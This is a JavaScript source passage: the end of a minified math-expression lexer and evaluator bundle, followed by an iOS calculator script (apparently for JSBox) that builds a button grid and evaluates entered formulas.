                    i = [f.math.sin, f.math.cos, f.math.tan, "PI", "(", ")", f.math.P, f.math.C, f.math.asin, f.math.acos, f.math.atan, "7", "8", "9", Math.floor, f.math.cosh, f.math.acosh, Math.log, Math.pow, Math.sqrt, "4", "5", "6", f.math.div, f.math.fact, f.math.tanh, f.math.atanh, f.math.mod, "1", "2", "3", f.math.mul, f.math.sinh, f.math.asinh, "E", f.math.log, "0", ".", f.math.add, f.math.sub, ",", f.math.sigma, "n", f.math.Pi, Math.pow],
                    j = {
                        0: 11,
                        1: 0,
                        2: 3,
                        3: 0,
                        4: 0,
                        5: 0,
                        6: 0,
                        7: 11,
                        8: 11,
                        9: 1,
                        10: 10,
                        11: 0,
                        12: 11,
                        13: 0
                    },
                    k = [0, 0, 0, 3, 4, 5, 10, 10, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 10, 0, 1, 1, 1, 2, 7, 0, 0, 2, 1, 1, 1, 2, 0, 0, 3, 0, 1, 6, 9, 9, 11, 12, 13, 12, 8],
                    l = {
                        0: !0,
                        1: !0,
                        3: !0,
                        4: !0,
                        6: !0,
                        8: !0,
                        9: !0,
                        12: !0,
                        13: !0
                    },
                    m = {
                        0: !0,
                        1: !0,
                        2: !0,
                        3: !0,
                        4: !0,
                        5: !0,
                        6: !0,
                        7: !0,
                        8: !0,
                        9: !0,
                        10: !0,
                        11: !0,
                        12: !0,
                        13: !0
                    },
                    n = {
                        0: !0,
                        3: !0,
                        4: !0,
                        8: !0,
                        12: !0,
                        13: !0
                    },
                    o = {},
                    p = {
                        0: !0,
                        1: !0,
                        3: !0,
                        4: !0,
                        6: !0,
                        8: !0,
                        12: !0,
                        13: !0
                    },
                    q = {
                        1: !0
                    },
                    r = [
                        [],
                        ["1", "2", "3", "7", "8", "9", "4", "5", "6", "+", "-", "*", "/", "(", ")", "^", "!", "P", "C", "e", "0", ".", ",", "n"],
                        ["pi", "ln", "Pi"],
                        ["sin", "cos", "tan", "Del", "int", "Mod", "log", "pow"],
                        ["asin", "acos", "atan", "cosh", "root", "tanh", "sinh"],
                        ["acosh", "atanh", "asinh", "Sigma"]
                    ];
                f.addToken = function (a) {
                    for (var b = 0; b < a.length; b++) {
                        var c = a[b].token.length,
                            d = -1;
                        if (c < r.length)
                            for (var e = 0; e < r[c].length; e++)
                                if (a[b].token === r[c][e]) {
                                    d = g.indexOf(r[c][e]);
                                    break
                                } d === -1 ? (g.push(a[b].token), k.push(a[b].type), r.length <= a[b].token.length && (r[a[b].token.length] = []), r[a[b].token.length].push(a[b].token), i.push(a[b].value), h.push(a[b].show)) : (g[d] = a[b].token, k[d] = a[b].type, i[d] = a[b].value, h[d] = a[b].show)
                    }
                }, f.lex = function (a, b) {
                    "use strict";
                    var c, s, t, u, v = {
                            value: f.math.changeSign,
                            type: 0,
                            pre: 21,
                            show: "-"
                        },
                        w = {
                            value: ")",
                            show: ")",
                            type: 5,
                            pre: 0
                        },
                        x = {
                            value: "(",
                            type: 4,
                            pre: 0,
                            show: "("
                        },
                        y = [x],
                        z = [],
                        A = a,
                        B = 0,
                        C = l,
                        D = 0,
                        E = o,
                        F = "";
                    "undefined" != typeof b && f.addToken(b);
                    var G = {};
                    for (s = 0; s < A.length; s++)
                        if (" " !== A[s]) {
                            for (c = "", t = A.length - s > r.length - 2 ? r.length - 1 : A.length - s; t > 0; t--)
                                for (u = 0; u < r[t].length; u++) e(A, r[t][u], s, t) && (c = r[t][u], u = r[t].length, t = 0);
                            if (s += c.length - 1, "" === c) throw new f.Exception("Can't understand after " + A.slice(s));
                            var H, I = g.indexOf(c),
                                J = c,
                                K = k[I],
                                L = i[I],
                                M = j[K],
                                N = h[I],
                                O = y[y.length - 1];
                            for (H = z.length; H-- && 0 === z[H];)
                                if ([0, 2, 3, 5, 9, 11, 12, 13].indexOf(K) !== -1) {
                                    if (C[K] !== !0) throw new f.Exception(c + " is not allowed after " + F);
                                    y.push(w), C = m, E = p, d(z, -1).pop()
                                } if (C[K] !== !0) throw new f.Exception(c + " is not allowed after " + F);
                            if (E[K] === !0 && (K = 2, L = f.math.mul, N = "&times;", M = 3, s -= c.length), G = {
                                    value: L,
                                    type: K,
                                    pre: M,
                                    show: N
                                }, 0 === K) C = l, E = o, d(z, 2).push(2), y.push(G), y.push(x);
                            else if (1 === K) 1 === O.type ? (O.value += L, d(z, 1)) : y.push(G), C = m, E = n;
                            else if (2 === K) C = l, E = o, d(z, 2), y.push(G);
                            else if (3 === K) y.push(G), C = m, E = p;
                            else if (4 === K) B += z.length, z = [], D++, C = l, E = o, y.push(G);
                            else if (5 === K) {
                                if (!D) throw new f.Exception("Closing parenthesis are more than opening one, wait What!!!");
                                for (; B--;) y.push(w);
                                B = 0, D--, C = m, E = p, y.push(G)
                            } else if (6 === K) {
                                if (O.hasDec) throw new f.Exception("Two decimals are not allowed in one number");
                                1 !== O.type && (O = {
                                    value: 0,
                                    type: 1,
                                    pre: 0
                                }, y.push(O), d(z, -1)), C = q, d(z, 1), E = o, O.value += L, O.hasDec = !0
                            } else 7 === K && (C = m, E = p, d(z, 1), y.push(G));
                            8 === K ? (C = l, E = o, d(z, 4).push(4), y.push(G), y.push(x)) : 9 === K ? (9 === O.type ? O.value === f.math.add ? (O.value = L, O.show = N, d(z, 1)) : O.value === f.math.sub && "-" === N && (O.value = f.math.add, O.show = "+", d(z, 1)) : 5 !== O.type && 7 !== O.type && 1 !== O.type && 3 !== O.type && 13 !== O.type ? "-" === J && (C = l, E = o, d(z, 2).push(2), y.push(v), y.push(x)) : (y.push(G), d(z, 2)), C = l, E = o) : 10 === K ? (C = l, E = o, d(z, 2), y.push(G)) : 11 === K ? (C = l, E = o, y.push(G)) : 12 === K ? (C = l, E = o, d(z, 6).push(6), y.push(G), y.push(x)) : 13 === K && (C = m, E = p, y.push(G)), d(z, -1), F = c
                        } for (H = z.length; H-- && 0 === z[H];) y.push(w), d(z, -1).pop();
                    if (C[5] !== !0) throw new f.Exception("complete the expression");
                    for (; D--;) y.push(w);
                    return y.push(w), new f(y)
                }, b.exports = f
            }, {
                "./math_function.js": 3
            }],
            3: [function (a, b, c) {
                var d = function (a) {
                    this.value = a
                };
                d.math = {
                    isDegree: !0,
                    acos: function (a) {
                        return d.math.isDegree ? 180 / Math.PI * Math.acos(a) : Math.acos(a)
                    },
                    add: function (a, b) {
                        return a + b
                    },
                    asin: function (a) {
                        return d.math.isDegree ? 180 / Math.PI * Math.asin(a) : Math.asin(a)
                    },
                    atan: function (a) {
                        return d.math.isDegree ? 180 / Math.PI * Math.atan(a) : Math.atan(a)
                    },
                    acosh: function (a) {
                        return Math.log(a + Math.sqrt(a * a - 1))
                    },
                    asinh: function (a) {
                        return Math.log(a + Math.sqrt(a * a + 1))
                    },
                    atanh: function (a) {
                        return Math.log((1 + a) / (1 - a))
                    },
                    C: function (a, b) {
                        var c = 1,
                            e = a - b,
                            f = b;
                        f < e && (f = e, e = b);
                        for (var g = f + 1; g <= a; g++) c *= g;
                        return c / d.math.fact(e)
                    },
                    changeSign: function (a) {
                        return -a
                    },
                    cos: function (a) {
                        return d.math.isDegree && (a = d.math.toRadian(a)), Math.cos(a)
                    },
                    cosh: function (a) {
                        return (Math.pow(Math.E, a) + Math.pow(Math.E, -1 * a)) / 2
                    },
                    div: function (a, b) {
                        return a / b
                    },
                    fact: function (a) {
                        if (a % 1 !== 0) return "NaN";
                        for (var b = 1, c = 2; c <= a; c++) b *= c;
                        return b
                    },
                    inverse: function (a) {
                        return 1 / a
                    },
                    log: function (a) {
                        return Math.log(a) / Math.log(10)
                    },
                    mod: function (a, b) {
                        return a % b
                    },
                    mul: function (a, b) {
                        return a * b
                    },
                    P: function (a, b) {
                        for (var c = 1, d = Math.floor(a) - Math.floor(b) + 1; d <= Math.floor(a); d++) c *= d;
                        return c
                    },
                    Pi: function (a, b, c) {
                        for (var d = 1, e = a; e <= b; e++) d *= Number(c.postfixEval({
                            n: e
                        }));
                        return d
                    },
                    pow10x: function (a) {
                        for (var b = 1; a--;) b *= 10;
                        return b
                    },
                    sigma: function (a, b, c) {
                        for (var d = 0, e = a; e <= b; e++) d += Number(c.postfixEval({
                            n: e
                        }));
                        return d
                    },
                    sin: function (a) {
                        return d.math.isDegree && (a = d.math.toRadian(a)), Math.sin(a)
                    },
                    sinh: function (a) {
                        return (Math.pow(Math.E, a) - Math.pow(Math.E, -1 * a)) / 2
                    },
                    sub: function (a, b) {
                        return a - b
                    },
                    tan: function (a) {
                        return d.math.isDegree && (a = d.math.toRadian(a)), Math.tan(a)
                    },
                    tanh: function (a) {
                        return d.sinha(a) / d.cosha(a)
                    },
                    toRadian: function (a) {
                        return a * Math.PI / 180
                    }
                }, d.Exception = function (a) {
                    this.message = a
                }, b.exports = d
            }, {}],
            4: [function (a, b, c) {
                var d = a("./lexer.js");
                d.prototype.toPostfix = function () {
                    "use strict";
                    for (var a, b, c, e, f, g = [], h = [{
                            value: "(",
                            type: 4,
                            pre: 0
                        }], i = this.value, j = 1; j < i.length; j++)
                        if (1 === i[j].type || 3 === i[j].type || 13 === i[j].type) 1 === i[j].type && (i[j].value = Number(i[j].value)), g.push(i[j]);
                        else if (4 === i[j].type) h.push(i[j]);
                    else if (5 === i[j].type)
                        for (; 4 !== (b = h.pop()).type;) g.push(b);
                    else if (11 === i[j].type) {
                        for (; 4 !== (b = h.pop()).type;) g.push(b);
                        h.push(b)
                    } else {
                        a = i[j], e = a.pre, f = h[h.length - 1], c = f.pre;
                        var k = "Math.pow" == f.value && "Math.pow" == a.value;
                        if (e > c) h.push(a);
                        else {
                            for (; c >= e && !k || k && e < c;) b = h.pop(), f = h[h.length - 1], g.push(b), c = f.pre, k = "Math.pow" == a.value && "Math.pow" == f.value;
                            h.push(a)
                        }
                    }
                    return new d(g)
                }, b.exports = d
            }, {
                "./lexer.js": 2
            }],
            5: [function (a, b, c) {
                var d = a("./postfix.js");
                d.prototype.postfixEval = function (a) {
                    "use strict";
                    a = a || {}, a.PI = Math.PI, a.E = Math.E;
                    for (var b, c, e, f = [], g = this.value, h = "undefined" != typeof a.n, i = 0; i < g.length; i++) 1 === g[i].type ? f.push({
                        value: g[i].value,
                        type: 1
                    }) : 3 === g[i].type ? f.push({
                        value: a[g[i].value],
                        type: 1
                    }) : 0 === g[i].type ? "undefined" == typeof f[f.length - 1].type ? f[f.length - 1].value.push(g[i]) : f[f.length - 1].value = g[i].value(f[f.length - 1].value) : 7 === g[i].type ? "undefined" == typeof f[f.length - 1].type ? f[f.length - 1].value.push(g[i]) : f[f.length - 1].value = g[i].value(f[f.length - 1].value) : 8 === g[i].type ? (b = f.pop(), c = f.pop(), f.push({
                        type: 1,
                        value: g[i].value(c.value, b.value)
                    })) : 10 === g[i].type ? (b = f.pop(), c = f.pop(), "undefined" == typeof c.type ? (c.value = c.concat(b), c.value.push(g[i]), f.push(c)) : "undefined" == typeof b.type ? (b.unshift(c), b.push(g[i]), f.push(b)) : f.push({
                        type: 1,
                        value: g[i].value(c.value, b.value)
                    })) : 2 === g[i].type || 9 === g[i].type ? (b = f.pop(), c = f.pop(), "undefined" == typeof c.type ? (console.log(c), c = c.concat(b), c.push(g[i]), f.push(c)) : "undefined" == typeof b.type ? (b.unshift(c), b.push(g[i]), f.push(b)) : f.push({
                        type: 1,
                        value: g[i].value(c.value, b.value)
                    })) : 12 === g[i].type ? (b = f.pop(), "undefined" != typeof b.type && (b = [b]), c = f.pop(), e = f.pop(), f.push({
                        type: 1,
                        value: g[i].value(e.value, c.value, new d(b))
                    })) : 13 === g[i].type && (h ? f.push({
                        value: a[g[i].value],
                        type: 3
                    }) : f.push([g[i]]));
                    if (f.length > 1) throw new d.exception("Uncaught Syntax error");
                    return f[0].value > 1e15 ? "Infinity" : parseFloat(f[0].value.toFixed(15))
                }, d.eval = function (a, b, c) {
                    return "undefined" == typeof b ? this.lex(a).toPostfix().postfixEval() : "undefined" == typeof c ? "undefined" != typeof b.length ? this.lex(a, b).toPostfix().postfixEval() : this.lex(a).toPostfix().postfixEval(b) : this.lex(a, b).toPostfix().postfixEval(c)
                }, b.exports = d
            }, {
                "./postfix.js": 4
            }]
        }, {}, [1])(1)
    });

    let compactMode = $app.env != $env.app && $app.env != $env.action;
    var lastKey = null;

    $define({
        type: "CalcButton: UIButton",
        props: [
            "container",
            "label",
            "overlay"
        ],
        events: {
            initWithInfo: info => {
                self = self.$super().$init();

                self.$setTitle_forState(info.title, 0);
                self.$setBackgroundColor(info.bgcolor.runtimeValue());
                self.$setTitleColor_forState(info.titleColor.runtimeValue(), 0);
                self.$setInfo(info.coord.runtimeValue());
                let label = self.$titleLabel();
                let font = $objc("UIFont").$systemFontOfSize_weight(info.fontSize, -0.5).rawValue();
                label.$setFont(font);

                let overlay = $objc("UIView").$new();
                overlay.$setBackgroundColor($color("black").runtimeValue());
                overlay.$setAlpha(0);
                self.$addSubview(overlay);
                self.$setOverlay(overlay);

                return self;
            },
            layoutSubviews: () => {
                self.$super().$layoutSubviews();
                let overlay = self.$overlay();
                overlay.$setFrame(self.$bounds());
            },
            setHighlighted: highlighted => {
                let overlay = self.$overlay();
                let alpha = highlighted ? 0.1 : 0;
                overlay.$setAlpha(alpha);
            }
        }
    });

    const colors = {
        black: $color("#000000"),
        white: $color("#ffffff"),
        red: $color("#ff3b30"),
        darkBlue: $color("#37474f"),
        lightBlue: $color("#157efb"),
        lightGray: $color("#eef1f1"),
    }

    const symbols = {
        clear: "C",
        back: "←",
        copy: "copy",
        enter: "enter",
        dot: ".",
        plus: "﹢",
        minus: "﹣",
        times: "×",
        obelus: "÷",
        equals: "=",
    }

    $ui.push({
        props: {
            title: $l10n("Calculator"),
            bgcolor: colors.darkBlue
        },
        views: [{
                type: "view",
                props: {
                    id: "container"
                },
                layout: (make, view) => {
                    make.edges.equalTo(view.super.safeArea);
                },
                events: {
                    layoutSubviews: view => {

                        let subviews = view.views;
                        let width = view.frame.width;
                        let height = view.frame.height;
                        let cols = compactMode ? 10 : 4;
                        let rows = compactMode ? 2 : 5;
                        let inset = 1.0 / $device.info.screen.scale;
                        let itemWidth = (width - (cols - 1) * inset) / cols;
                        let itemHeight = Math.min(itemWidth, (height - rows * inset) / (rows + 1));

                        for (const subview of subviews) {
                            let coord = subview.info;
                            if (coord) {
                                let row = coord[0];
                                let col = coord[1];
                                let y = height - (itemHeight * (row + 1) + inset * row);
                                let x = col * (itemWidth + inset);
                                subview.frame = $rect(x, y, itemWidth, itemHeight);
                            }
                        }

                        let gradient = $("gradient-layer");
                        gradient.frame = $rect(view.frame.x, 0, width, height - (itemHeight * rows + inset * (rows - 1)));
                    }
                }
            },
            {
                type: "gradient",
                props: {
                    id: "gradient-layer",
                    colors: [colors.black, colors.darkBlue],
                    locations: [0.0, 1.0],
                    startPoint: $point(0, 0.5),
                    endPoint: $point(0, 1)
                },
                views: [{
                    type: "label",
                    props: {
                        id: "result-label",
                        text: "0",
                        font: (() => {
                            let size = ($app.env == $env.app || $app.env == $env.keyboard) ? 64 : 32;
                            let font = $objc("UIFont").$systemFontOfSize(size);
                            return font.rawValue();
                        })(),
                        textColor: colors.white,
                        align: $align.right,
                        lines: 0
                    },
                    layout: (make, view) => {
                        make.top.bottom.equalTo(0);
                        make.left.right.inset(8);
                    }
                }]
            }
        ]
    });

    let container = $("container");
    container.add(newButton("1", compactMode ? [1, 0] : [1, 0], colors.white, colors.darkBlue, 18));
    container.add(newButton("2", compactMode ? [1, 1] : [1, 1], colors.white, colors.darkBlue, 18));
    container.add(newButton("3", compactMode ? [1, 2] : [1, 2], colors.white, colors.darkBlue, 18));
    container.add(newButton("4", compactMode ? [1, 3] : [2, 0], colors.white, colors.darkBlue, 18));
    container.add(newButton("5", compactMode ? [1, 4] : [2, 1], colors.white, colors.darkBlue, 18));
    container.add(newButton("6", compactMode ? [1, 5] : [2, 2], colors.white, colors.darkBlue, 18));
    container.add(newButton("7", compactMode ? [1, 6] : [3, 0], colors.white, colors.darkBlue, 18));
    container.add(newButton("8", compactMode ? [1, 7] : [3, 1], colors.white, colors.darkBlue, 18));
    container.add(newButton("9", compactMode ? [1, 8] : [3, 2], colors.white, colors.darkBlue, 18));
    container.add(newButton("0", compactMode ? [1, 9] : [0, 0], colors.white, colors.darkBlue, 18));
    container.add(newButton(symbols.clear, compactMode ? [0, 0] : [4, 0], colors.lightGray, colors.red, 18));
    container.add(newButton(symbols.back, compactMode ? [0, 1] : [0, 2], colors.lightGray, colors.red, 18));
    container.add(newButton(symbols.copy, compactMode ? [0, 2] : [4, 1], colors.lightGray, colors.darkBlue, 15));
    container.add(newButton(symbols.enter, compactMode ? [0, 3] : [4, 2], colors.lightGray, colors.darkBlue, 15));
    container.add(newButton(symbols.dot, compactMode ? [0, 4] : [0, 1], colors.lightGray, colors.darkBlue, 20));
    container.add(newButton(symbols.plus, compactMode ? [0, 5] : [1, 3], colors.lightBlue, colors.white, 23));
    container.add(newButton(symbols.minus, compactMode ? [0, 6] : [2, 3], colors.lightBlue, colors.white, 23));
    container.add(newButton(symbols.times, compactMode ? [0, 7] : [3, 3], colors.lightBlue, colors.white, 23));
    container.add(newButton(symbols.obelus, compactMode ? [0, 8] : [4, 3], colors.lightBlue, colors.white, 23));
    container.add(newButton(symbols.equals, compactMode ? [0, 9] : [0, 3], colors.lightBlue, colors.white, 23));

    function newButton(title, coord, bgcolor, titleColor, fontSize) {

        let button = $objc("CalcButton").$alloc().$initWithInfo({
            title: title,
            coord: coord,
            bgcolor: bgcolor,
            titleColor: titleColor,
            fontSize: fontSize + (compactMode ? 0 : 20),
        });

        return {
            type: "runtime",
            props: {
                view: button
            },
            events: {
                tapped: tapped
            }
        }
    }

    function tapped(sender) {
        $device.taptic();
        $keyboard.playInputClick();

        let key = sender.title;
        let label = $("result-label");
        let text = label.text;
        let number = parseInt(text);
        let isInvalid = isNaN(number) || text === "0" || !isFinite(number);

        if (key === symbols.clear) {
            label.text = "0";
        } else if (key === symbols.back) {
            if (text.length === 1 || isInvalid) {
                label.text = "0";
            } else {
                label.text = text.substring(0, text.length - 1);
            }
        } else if (key === symbols.copy) {
            $clipboard.text = text;
        } else if (key === symbols.enter) {
            $keyboard.insert(text);
        } else if (key === symbols.equals) {
            try {
                var formula = text;
                formula = formula.replace(new RegExp(symbols.plus, "g"), "+");
                formula = formula.replace(new RegExp(symbols.minus, "g"), "-");
                formula = formula.replace(new RegExp(symbols.times, "g"), "*");
                formula = formula.replace(new RegExp(symbols.obelus, "g"), "/");
                label.text = mexp.eval(formula);
            } catch (err) {
                label.text = "Error";
            }
        } else if (
            key === symbols.plus ||
            key === symbols.minus ||
            key === symbols.times ||
            key === symbols.obelus ||
            key === symbols.dot) {
            if (!text.endsWith(key)) {
                if (text === "0" && key === symbols.minus) {
                    label.text = key;
                } else {
                    label.text = text + key;
                }
            }
        } else {
            if (text !== symbols.minus && (isInvalid || lastKey === symbols.equals)) {
                label.text = key;
            } else {
                label.text = text + key;
            }
        }

        lastKey = key;
    }

}